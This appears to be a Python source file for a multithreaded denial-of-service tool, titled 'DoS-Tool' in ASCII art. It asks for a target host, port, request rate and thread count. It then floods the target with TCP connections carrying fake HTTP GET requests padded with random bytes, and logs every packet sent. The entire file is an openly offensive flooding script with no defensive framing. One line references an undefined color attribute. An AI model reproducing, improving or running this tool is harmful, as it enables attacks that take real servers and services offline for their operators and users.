



# --


import time
import os 
import socket
import random
import datetime
from colorama import Fore, Style, init
from threading import Thread


# -- 

init()
cartella_log = "logs"
data_ora_corrente = datetime.datetime.now()
nome_file = data_ora_corrente.strftime("%Y-%m-%d_%H-%M-%S.txt")


def log(message, write):

    os.makedirs(cartella_log, exist_ok=True)

    try:

        if write:         
            
            print(message)

            percorso_file = os.path.join(cartella_log, nome_file)
            file_log = open(percorso_file, "a")
            file_log.write(message + "\n")
            
            file_log.close()

        if not write:

            percorso_file = os.path.join(cartella_log, nome_file)
            file_log = open(percorso_file, "a")
            file_log.write(message + "\n")
            file_log.close()

    except Exception as error:
        print(error)

# --    


#try:
#    
#    os.system("clear")
#
#except Exception as error:
#    pass


if not __name__ == "__main__":
    exit()
      

class ConsoleColors:

    OKBLUE = Fore.LIGHTBLUE_EX
    OKGREEN = Fore.GREEN
    WARNING = Fore.YELLOW
    FAIL = Fore.RED
    BOLD = Style.RESET_ALL
    

log(message= ConsoleColors.BOLD + ConsoleColors.WARNING + '''
 ____       ____      _____           _ 
|  _ \  ___/ ___|    |_   _|__   ___ | |
| | | |/ _ \___ \ _____| |/ _ \ / _ \| |
| |_| | (_) |__) |_____| | (_) | (_) | |
|____/ \___/____/      |_|\___/ \___/|_|

      ''', write=True)
    
def getport():

    try:

        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    
    except ValueError:

        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default 80" + ConsoleColors.OKGREEN)
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))


ip = socket.gethostbyname(host)
bytesToSend = random._urandom(2450)
i = 0;


class Count:
    packetCounter = 0 

def goForDosThatThing():

    try:

        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:

                dosSocket.connect((ip, port))

                for i in range(speedPerRun):

                    try:

                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        log(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----", write=True)
                        Count.packetCounter = Count.packetCounter + 1

                    except socket.error:

                        log(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!", write=True)

                    except KeyboardInterrupt:

                        log(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user", write=True)

            except socket.error:

                log(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!", write=True)

            except KeyboardInterrupt:

                log(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user", write=True)
            dosSocket.close()

    except KeyboardInterrupt:

        log(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user", write=True)


try:


    log(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
    _   _   _             _      ____  _             _   _             
   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
 / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                 |___/ 
          ''', write=True)
    

    log(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ", write = True)
    time.sleep(1)
    log(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%", write = True)
    time.sleep(1)
    log(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%", write = True)
    time.sleep(1)
    log(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%", write = True)
    time.sleep(1)
    log(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%", write = True)
    

    for i in range(threads):

        try:

            t = Thread(target=goForDosThatThing)
            t.start()

        except KeyboardInterrupt:

            log(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user", write=True)  
              
except KeyboardInterrupt:
    log(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user", write=True)


# --